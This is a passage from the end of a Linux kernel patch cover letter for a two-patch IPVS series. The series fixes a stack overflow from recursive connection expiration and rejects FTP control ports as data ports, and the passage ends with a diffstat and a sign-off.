    shell/Python PoC and the decoded stack-guard-page log from the a401
    baseline.
  - v1 Link:
    https://lore.kernel.org/all/cover.1789110326.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi
Zihan Xi (2):
  ipvs: avoid stack overflow from recursive connection expiration
  ipvs: reject FTP control ports as data ports

 net/netfilter/ipvs/ip_vs_conn.c | 17 ++++++++++++-----
 net/netfilter/ipvs/ip_vs_ftp.c  | 18 ++++++++++++++++++
 2 files changed, 30 insertions(+), 5 deletions(-)

-- 
2.43.0
